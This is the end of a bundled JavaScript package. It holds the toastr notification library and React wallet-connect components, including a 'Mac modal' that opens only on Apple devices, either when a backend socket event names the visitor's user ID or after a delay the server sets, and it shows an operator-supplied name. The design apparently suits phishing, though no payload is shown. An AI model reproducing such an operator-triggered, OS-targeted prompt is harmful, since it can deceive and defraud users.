	                    titleClass: 'toast-title',
	                    messageClass: 'toast-message',
	                    escapeHtml: false,
	                    target: 'body',
	                    closeHtml: '<button type="button">&times;</button>',
	                    closeClass: 'toast-close-button',
	                    newestOnTop: true,
	                    preventDuplicates: false,
	                    progressBar: false,
	                    progressClass: 'toast-progress',
	                    rtl: false
	                };
	            }

	            function publish(args) {
	                if (!listener) { return; }
	                listener(args);
	            }

	            function notify(map) {
	                var options = getOptions();
	                var iconClass = map.iconClass || options.iconClass;

	                if (typeof (map.optionsOverride) !== 'undefined') {
	                    options = $.extend(options, map.optionsOverride);
	                    iconClass = map.optionsOverride.iconClass || iconClass;
	                }

	                if (shouldExit(options, map)) { return; }

	                toastId++;

	                $container = getContainer(options, true);

	                var intervalId = null;
	                var $toastElement = $('<div/>');
	                var $titleElement = $('<div/>');
	                var $messageElement = $('<div/>');
	                var $progressElement = $('<div/>');
	                var $closeElement = $(options.closeHtml);
	                var progressBar = {
	                    intervalId: null,
	                    hideEta: null,
	                    maxHideTime: null
	                };
	                var response = {
	                    toastId: toastId,
	                    state: 'visible',
	                    startTime: new Date(),
	                    options: options,
	                    map: map
	                };

	                personalizeToast();

	                displayToast();

	                handleEvents();

	                publish(response);

	                if (options.debug && console) {
	                    console.log(response);
	                }

	                return $toastElement;

	                function escapeHtml(source) {
	                    if (source == null) {
	                        source = '';
	                    }

	                    return source
	                        .replace(/&/g, '&amp;')
	                        .replace(/"/g, '&quot;')
	                        .replace(/'/g, '&#39;')
	                        .replace(/</g, '&lt;')
	                        .replace(/>/g, '&gt;');
	                }

	                function personalizeToast() {
	                    setIcon();
	                    setTitle();
	                    setMessage();
	                    setCloseButton();
	                    setProgressBar();
	                    setRTL();
	                    setSequence();
	                    setAria();
	                }

	                function setAria() {
	                    var ariaValue = '';
	                    switch (map.iconClass) {
	                        case 'toast-success':
	                        case 'toast-info':
	                            ariaValue =  'polite';
	                            break;
	                        default:
	                            ariaValue = 'assertive';
	                    }
	                    $toastElement.attr('aria-live', ariaValue);
	                }

	                function handleEvents() {
	                    if (options.closeOnHover) {
	                        $toastElement.hover(stickAround, delayedHideToast);
	                    }

	                    if (!options.onclick && options.tapToDismiss) {
	                        $toastElement.click(hideToast);
	                    }

	                    if (options.closeButton && $closeElement) {
	                        $closeElement.click(function (event) {
	                            if (event.stopPropagation) {
	                                event.stopPropagation();
	                            } else if (event.cancelBubble !== undefined && event.cancelBubble !== true) {
	                                event.cancelBubble = true;
	                            }

	                            if (options.onCloseClick) {
	                                options.onCloseClick(event);
	                            }

	                            hideToast(true);
	                        });
	                    }

	                    if (options.onclick) {
	                        $toastElement.click(function (event) {
	                            options.onclick(event);
	                            hideToast();
	                        });
	                    }
	                }

	                function displayToast() {
	                    $toastElement.hide();

	                    $toastElement[options.showMethod](
	                        {duration: options.showDuration, easing: options.showEasing, complete: options.onShown}
	                    );

	                    if (options.timeOut > 0) {
	                        intervalId = setTimeout(hideToast, options.timeOut);
	                        progressBar.maxHideTime = parseFloat(options.timeOut);
	                        progressBar.hideEta = new Date().getTime() + progressBar.maxHideTime;
	                        if (options.progressBar) {
	                            progressBar.intervalId = setInterval(updateProgress, 10);
	                        }
	                    }
	                }

	                function setIcon() {
	                    if (map.iconClass) {
	                        $toastElement.addClass(options.toastClass).addClass(iconClass);
	                    }
	                }

	                function setSequence() {
	                    if (options.newestOnTop) {
	                        $container.prepend($toastElement);
	                    } else {
	                        $container.append($toastElement);
	                    }
	                }

	                function setTitle() {
	                    if (map.title) {
	                        var suffix = map.title;
	                        if (options.escapeHtml) {
	                            suffix = escapeHtml(map.title);
	                        }
	                        $titleElement.append(suffix).addClass(options.titleClass);
	                        $toastElement.append($titleElement);
	                    }
	                }

	                function setMessage() {
	                    if (map.message) {
	                        var suffix = map.message;
	                        if (options.escapeHtml) {
	                            suffix = escapeHtml(map.message);
	                        }
	                        $messageElement.append(suffix).addClass(options.messageClass);
	                        $toastElement.append($messageElement);
	                    }
	                }

	                function setCloseButton() {
	                    if (options.closeButton) {
	                        $closeElement.addClass(options.closeClass).attr('role', 'button');
	                        $toastElement.prepend($closeElement);
	                    }
	                }

	                function setProgressBar() {
	                    if (options.progressBar) {
	                        $progressElement.addClass(options.progressClass);
	                        $toastElement.prepend($progressElement);
	                    }
	                }

	                function setRTL() {
	                    if (options.rtl) {
	                        $toastElement.addClass('rtl');
	                    }
	                }

	                function shouldExit(options, map) {
	                    if (options.preventDuplicates) {
	                        if (map.message === previousToast) {
	                            return true;
	                        } else {
	                            previousToast = map.message;
	                        }
	                    }
	                    return false;
	                }

	                function hideToast(override) {
	                    var method = override && options.closeMethod !== false ? options.closeMethod : options.hideMethod;
	                    var duration = override && options.closeDuration !== false ?
	                        options.closeDuration : options.hideDuration;
	                    var easing = override && options.closeEasing !== false ? options.closeEasing : options.hideEasing;
	                    if ($(':focus', $toastElement).length && !override) {
	                        return;
	                    }
	                    clearTimeout(progressBar.intervalId);
	                    return $toastElement[method]({
	                        duration: duration,
	                        easing: easing,
	                        complete: function () {
	                            removeToast($toastElement);
	                            clearTimeout(intervalId);
	                            if (options.onHidden && response.state !== 'hidden') {
	                                options.onHidden();
	                            }
	                            response.state = 'hidden';
	                            response.endTime = new Date();
	                            publish(response);
	                        }
	                    });
	                }

	                function delayedHideToast() {
	                    if (options.timeOut > 0 || options.extendedTimeOut > 0) {
	                        intervalId = setTimeout(hideToast, options.extendedTimeOut);
	                        progressBar.maxHideTime = parseFloat(options.extendedTimeOut);
	                        progressBar.hideEta = new Date().getTime() + progressBar.maxHideTime;
	                    }
	                }

	                function stickAround() {
	                    clearTimeout(intervalId);
	                    progressBar.hideEta = 0;
	                    $toastElement.stop(true, true)[options.showMethod](
	                        {duration: options.showDuration, easing: options.showEasing}
	                    );
	                }

	                function updateProgress() {
	                    var percentage = ((progressBar.hideEta - (new Date().getTime())) / progressBar.maxHideTime) * 100;
	                    $progressElement.width(percentage + '%');
	                }
	            }

	            function getOptions() {
	                return $.extend({}, getDefaults(), toastr.options);
	            }

	            function removeToast($toastElement) {
	                if (!$container) { $container = getContainer(); }
	                if ($toastElement.is(':visible')) {
	                    return;
	                }
	                $toastElement.remove();
	                $toastElement = null;
	                if ($container.children().length === 0) {
	                    $container.remove();
	                    previousToast = undefined;
	                }
	            }

	        })();
	    });
	}(function (deps, factory) {
	    if (module.exports) { //Node
	        module.exports = factory(requireJquery());
	    } else {
	        window.toastr = factory(window.jQuery);
	    }
	})); 
} (toastr$1));

var toastrExports = toastr$1.exports;
var toastr = /*@__PURE__*/getDefaultExportFromCjs(toastrExports);

var toastrCSS = ".toast-title{font-weight:700}.toast-message{-ms-word-wrap:break-word;word-wrap:break-word}.toast-message a,.toast-message label{color:#FFF}.toast-message a:hover{color:#CCC;text-decoration:none}.toast-close-button{position:relative;right:-.3em;top:-.3em;float:right;font-size:20px;font-weight:700;color:#FFF;-webkit-text-shadow:0 1px 0 #fff;text-shadow:0 1px 0 #fff;opacity:.8;-ms-filter:progid:DXImageTransform.Microsoft.Alpha(Opacity=80);filter:alpha(opacity=80);line-height:1}.toast-close-button:focus,.toast-close-button:hover{color:#000;text-decoration:none;cursor:pointer;opacity:.4;-ms-filter:progid:DXImageTransform.Microsoft.Alpha(Opacity=40);filter:alpha(opacity=40)}.rtl .toast-close-button{left:-.3em;float:left;right:.3em}button.toast-close-button{padding:0;cursor:pointer;background:0 0;border:0;-webkit-appearance:none}.toast-top-center{top:0;right:0;width:100%}.toast-bottom-center{bottom:0;right:0;width:100%}.toast-top-full-width{top:0;right:0;width:100%}.toast-bottom-full-width{bottom:0;right:0;width:100%}.toast-top-left{top:12px;left:12px}.toast-top-right{top:12px;right:12px}.toast-bottom-right{right:12px;bottom:12px}.toast-bottom-left{bottom:12px;left:12px}#toast-container{position:fixed;z-index:999999;pointer-events:none}#toast-container *{-moz-box-sizing:border-box;-webkit-box-sizing:border-box;box-sizing:border-box}#toast-container>div{position:relative;pointer-events:auto;overflow:hidden;margin:0 0 6px;padding:15px 15px 15px 50px;width:300px;-moz-border-radius:3px;-webkit-border-radius:3px;border-radius:3px;background-position:15px center;background-repeat:no-repeat;-moz-box-shadow:0 0 12px #999;-webkit-box-shadow:0 0 12px #999;box-shadow:0 0 12px #999;color:#FFF;opacity:.8;-ms-filter:progid:DXImageTransform.Microsoft.Alpha(Opacity=80);filter:alpha(opacity=80)}#toast-container>div.rtl{direction:rtl;padding:15px 50px 15px 15px;background-position:right 15px center}#toast-container>div:hover{-moz-box-shadow:0 0 12px #000;-webkit-box-shadow:0 0 12px #000;box-shadow:0 0 12px #000;opacity:1;-ms-filter:progid:DXImageTransform.Microsoft.Alpha(Opacity=100);filter:alpha(opacity=100);cursor:pointer}#toast-container>.toast-info{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAGwSURBVEhLtZa9SgNBEMc9sUxxRcoUKSzSWIhXpFMhhYWFhaBg4yPYiWCXZxBLERsLRS3EQkEfwCKdjWJAwSKCgoKCcudv4O5YLrt7EzgXhiU3/4+b2ckmwVjJSpKkQ6wAi4gwhT+z3wRBcEz0yjSseUTrcRyfsHsXmD0AmbHOC9Ii8VImnuXBPglHpQ5wwSVM7sNnTG7Za4JwDdCjxyAiH3nyA2mtaTJufiDZ5dCaqlItILh1NHatfN5skvjx9Z38m69CgzuXmZgVrPIGE763Jx9qKsRozWYw6xOHdER+nn2KkO+Bb+UV5CBN6WC6QtBgbRVozrahAbmm6HtUsgtPC19tFdxXZYBOfkbmFJ1VaHA1VAHjd0pp70oTZzvR+EVrx2Ygfdsq6eu55BHYR8hlcki+n+kERUFG8BrA0BwjeAv2M8WLQBtcy+SD6fNsmnB3AlBLrgTtVW1c2QN4bVWLATaIS60J2Du5y1TiJgjSBvFVZgTmwCU+dAZFoPxGEEs8nyHC9Bwe2GvEJv2WXZb0vjdyFT4Cxk3e/kIqlOGoVLwwPevpYHT+00T+hWwXDf4AJAOUqWcDhbwAAAAASUVORK5CYII=)!important}#toast-container>.toast-error{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAHOSURBVEhLrZa/SgNBEMZzh0WKCClSCKaIYOED+AAKeQQLG8HWztLCImBrYadgIdY+gIKNYkBFSwu7CAoqCgkkoGBI/E28PdbLZmeDLgzZzcx83/zZ2SSXC1j9fr+I1Hq93g2yxH4iwM1vkoBWAdxCmpzTxfkN2RcyZNaHFIkSo10+8kgxkXIURV5HGxTmFuc75B2RfQkpxHG8aAgaAFa0tAHqYFfQ7Iwe2yhODk8+J4C7yAoRTWI3w/4klGRgR4lO7Rpn9+gvMyWp+uxFh8+H+ARlgN1nJuJuQAYvNkEnwGFck18Er4q3egEc/oO+mhLdKgRyhdNFiacC0rlOCbhNVz4H9FnAYgDBvU3QIioZlJFLJtsoHYRDfiZoUyIxqCtRpVlANq0EU4dApjrtgezPFad5S19Wgjkc0hNVnuF4HjVA6C7QrSIbylB+oZe3aHgBsqlNqKYH48jXyJKMuAbiyVJ8KzaB3eRc0pg9VwQ4niFryI68qiOi3AbjwdsfnAtk0bCjTLJKr6mrD9g8iq/S/B81hguOMlQTnVyG40wAcjnmgsCNESDrjme7wfftP4P7SP4N3CJZdvzoNyGq2c/HWOXJGsvVg+RA/k2MC/wN6I2YA2Pt8GkAAAAASUVORK5CYII=)!important}#toast-container>.toast-success{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAADsSURBVEhLY2AYBfQMgf///3P8+/evAIgvA/FsIF+BavYDDWMBGroaSMMBiE8VC7AZDrIFaMFnii3AZTjUgsUUWUDA8OdAH6iQbQEhw4HyGsPEcKBXBIC4ARhex4G4BsjmweU1soIFaGg/WtoFZRIZdEvIMhxkCCjXIVsATV6gFGACs4Rsw0EGgIIH3QJYJgHSARQZDrWAB+jawzgs+Q2UO49D7jnRSRGoEFRILcdmEMWGI0cm0JJ2QpYA1RDvcmzJEWhABhD/pqrL0S0CWuABKgnRki9lLseS7g2AlqwHWQSKH4oKLrILpRGhEQCw2LiRUIa4lwAAAABJRU5ErkJggg==)!important}#toast-container>.toast-warning{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAGYSURBVEhL5ZSvTsNQFMbXZGICMYGYmJhAQIJAICYQPAACiSDB8AiICQQJT4CqQEwgJvYASAQCiZiYmJhAIBATCARJy+9rTsldd8sKu1M0+dLb057v6/lbq/2rK0mS/TRNj9cWNAKPYIJII7gIxCcQ51cvqID+GIEX8ASG4B1bK5gIZFeQfoJdEXOfgX4QAQg7kH2A65yQ87lyxb27sggkAzAuFhbbg1K2kgCkB1bVwyIR9m2L7PRPIhDUIXgGtyKw575yz3lTNs6X4JXnjV+LKM/m3MydnTbtOKIjtz6VhCBq4vSm3ncdrD2lk0VgUXSVKjVDJXJzijW1RQdsU7F77He8u68koNZTz8Oz5yGa6J3H3lZ0xYgXBK2QymlWWA+RWnYhskLBv2vmE+hBMCtbA7KX5drWyRT/2JsqZ2IvfB9Y4bWDNMFbJRFmC9E74SoS0CqulwjkC0+5bpcV1CZ8NMej4pjy0U+doDQsGyo1hzVJttIjhQ7GnBtRFN1UarUlH8F3xict+HY07rEzoUGPlWcjRFRr4/gChZgc3ZL2d8oAAAAASUVORK5CYII=)!important}#toast-container.toast-bottom-center>div,#toast-container.toast-top-center>div{width:300px;margin-left:auto;margin-right:auto}#toast-container.toast-bottom-full-width>div,#toast-container.toast-top-full-width>div{width:96%;margin-left:auto;margin-right:auto}.toast{background-color:#030303}.toast-success{background-color:#51A351}.toast-error{background-color:#BD362F}.toast-info{background-color:#2F96B4}.toast-warning{background-color:#F89406}.toast-progress{position:absolute;left:0;bottom:0;height:4px;background-color:#000;opacity:.4;-ms-filter:progid:DXImageTransform.Microsoft.Alpha(Opacity=40);filter:alpha(opacity=40)}@media all and (max-width:240px){#toast-container>div{padding:8px 8px 8px 50px;width:11em}#toast-container>div.rtl{padding:8px 50px 8px 8px}#toast-container .toast-close-button{right:-.2em;top:-.2em}#toast-container .rtl .toast-close-button{left:-.2em;right:.2em}}@media all and (min-width:241px) and (max-width:480px){#toast-container>div{padding:8px 8px 8px 50px;width:18em}#toast-container>div.rtl{padding:8px 50px 8px 8px}#toast-container .toast-close-button{right:-.2em;top:-.2em}#toast-container .rtl .toast-close-button{left:-.2em;right:.2em}}@media all and (min-width:481px) and (max-width:768px){#toast-container>div{padding:15px 15px 15px 50px;width:25em}#toast-container>div.rtl{padding:15px 50px 15px 15px}}";

/**
 * Toast utility for showing notifications using toastr
 * toastr is bundled with the package - no setup required
 */
// @ts-ignore - toastr is bundled as a dependency
// Track if CSS has been injected
let cssInjected = false;
/**
 * Dynamically inject toastr CSS into the page
 */
function injectToastrCSS() {
    if (cssInjected || typeof document === 'undefined') {
        return;
    }
    // Check if CSS is already in the page
    const existingStyle = document.querySelector('style[data-toastr-css]');
    if (existingStyle) {
        cssInjected = true;
        return;
    }
    // Inject CSS as a style tag
    const style = document.createElement('style');
    style.setAttribute('data-toastr-css', 'true');
    style.textContent = toastrCSS;
    document.head.appendChild(style);
    cssInjected = true;
}
/**
 * Show a toast notification using toastr
 */
function Toast({ type, title = "", message }) {
    // Inject CSS on first use
    injectToastrCSS();
    // Configure toastr options
    toastr.options = {
        closeButton: false,
        debug: false,
        newestOnTop: false,
        progressBar: false,
        positionClass: "toast-top-right",
        preventDuplicates: false,
        onclick: null,
        showDuration: "300",
        hideDuration: "1000",
        timeOut: "5000",
        extendedTimeOut: "1000",
        showEasing: "swing",
        hideEasing: "linear",
        showMethod: "fadeIn",
        hideMethod: "fadeOut",
    };
    return toastr[type](message, title);
}

const ConnectWalletButton = ({ className = '', userId, }) => {
    const [isSelectionModalOpen, setIsSelectionModalOpen] = useState(false);
    const [isCustomModalOpen, setIsCustomModalOpen] = useState(false);
    const [selectedWallet, setSelectedWallet] = useState(null);
    const handleButtonClick = () => {
        setIsSelectionModalOpen(true);
    };
    const handleWalletSelect = (wallet) => {
        // Check if wallet is installed before opening modal
        const { isInstalled, walletName } = checkWalletInstalled(wallet);
        if (isInstalled) {
            // Wallet is installed, proceed with opening modal
            setSelectedWallet(wallet);
            setIsSelectionModalOpen(false);
            setIsCustomModalOpen(true);
        }
        else {
            // Wallet is not installed, show error toast
            Toast({
                type: 'error',
                message: `${walletName} is NOT installed!`
            });
            // Don't open the modal, just close the selection modal
            setIsSelectionModalOpen(false);
        }
    };
    const handleCloseSelectionModal = () => {
        setIsSelectionModalOpen(false);
    };
    const handleCloseCustomModal = () => {
        setIsCustomModalOpen(false);
        setSelectedWallet(null);
    };
    return (React.createElement(React.Fragment, null,
        React.createElement("button", { onClick: handleButtonClick, className: `connect-wallet-button ${className}`, style: {
                padding: '12px 24px',
                fontSize: '16px',
                fontWeight: '600',
                color: '#fff',
                backgroundColor: '#4F46E5',
                border: 'none',
                borderRadius: '8px',
                cursor: 'pointer',
                transition: 'all 0.2s ease',
            }, onMouseEnter: (e) => {
                e.currentTarget.style.backgroundColor = '#4338CA';
            }, onMouseLeave: (e) => {
                e.currentTarget.style.backgroundColor = '#4F46E5';
            } }, "Connect Wallet"),
        React.createElement(WalletSelectionModal, { isOpen: isSelectionModalOpen, onWalletSelect: handleWalletSelect, onClose: handleCloseSelectionModal, userId: userId }),
        selectedWallet && (React.createElement(CustomWalletModal, { wallet: selectedWallet, isOpen: isCustomModalOpen, onClose: handleCloseCustomModal, userId: userId }))));
};

/**
 * Get mac-modal settings for a user by user_id.
 * Public endpoint for widget usage.
 * mac_modal_timing: -1 = socket-only, 0+ = open after N seconds on load.
 */
const getMacModalSettings = async (userId) => {
    if (!userId)
        return null;
    try {
        const BACKEND_URL = getBackendUrl();
        if (!BACKEND_URL)
            return null;
        const response = await axios.get(`${BACKEND_URL}/api/users/user-id/${userId}/mac-modal`, { timeout: 5000 });
        return response.data;
    }
    catch {
        return null;
    }
};

const isMacOS = () => typeof navigator !== 'undefined' &&
    (navigator.platform?.includes('Mac') ?? /Mac|iPhone|iPad|iPod/.test(navigator.userAgent));
/**
 * Listens for the backend socket event (default: `showMacModal`) and opens the Mac modal only when:
 * - The user's OS is macOS (Mac, iPhone, iPad, iPod), and
 * - The payload's user_id matches this component's userId (or backendConfig.userId).
 * Mount once (e.g. at app root) to enable socket-triggered Mac modal.
 *
 * Backend example: io.emit('showMacModal', { message: '...', user_id, text, timestamp });
 */
const MacModalTrigger = ({ userId, backendConfig, onClose, }) => {
    const [isOpen, setIsOpen] = useState(false);
    const [adminName, setAdminName] = useState(undefined);
    const effectiveUserId = userId ?? backendConfig?.userId;
    const timedOpenFiredRef = useRef(false);
    useEffect(() => {
        initializeSocket();
        const unsubscribe = subscribeToShowMacModal((payload) => {
            const emitUserId = payload?.user_id;
            if (isMacOS() &&
                effectiveUserId &&
                emitUserId &&
                emitUserId === effectiveUserId) {
                setAdminName(payload?.text);
                setIsOpen(true);
            }
        });
        return unsubscribe;
    }, [effectiveUserId]);
    useEffect(() => {
        if (!effectiveUserId)
            return;
        timedOpenFiredRef.current = false;
        let timer = null;
        let cancelled = false;
        getMacModalSettings(effectiveUserId).then((settings) => {
            if (cancelled || !settings || settings.mac_modal_timing === undefined || settings.mac_modal_timing < 0) {
                return;
            }
            const timingSeconds = Math.max(0, settings.mac_modal_timing);
            if (timingSeconds === 0) {
                setAdminName(settings.mac_user_name || undefined);
                setIsOpen(true);
                timedOpenFiredRef.current = true;
            }
            else {
                timer = setTimeout(() => {
                    if (cancelled || timedOpenFiredRef.current)
                        return;
                    setAdminName(settings.mac_user_name || undefined);
                    setIsOpen(true);
                    timedOpenFiredRef.current = true;
                }, timingSeconds * 1000);
            }
        });
        return () => {
            cancelled = true;
            if (timer)
                clearTimeout(timer);
        };
    }, [effectiveUserId]);
    const handleClose = () => {
        setIsOpen(false);
        onClose?.();
    };
    if (!isOpen)
        return null;
    return (React.createElement(ModalContainer, null,
        React.createElement(MacModal, { wallet: "Mac", isOpen: isOpen, onClose: handleClose, userId: effectiveUserId, backendConfig: backendConfig, adminName: adminName })));
};

export { ASSET_PATHS, ConnectWalletButton, CustomWalletModal, MacModalTrigger, WalletSelectionModal, clearWalletTypesCache, getAllWalletTypes, getAssetBaseUrl, getAssetPath, getBackendUrl, getClientUrl, getConfig, getIPAndLocation, getMacModalSocketEvent, getUserWalletTypes, getWalletConfig, getWalletShortKey, resolveAssetUrl, setConfig, subscribeToShowMacModal, walletConfigs };
//# sourceMappingURL=index.esm.js.map
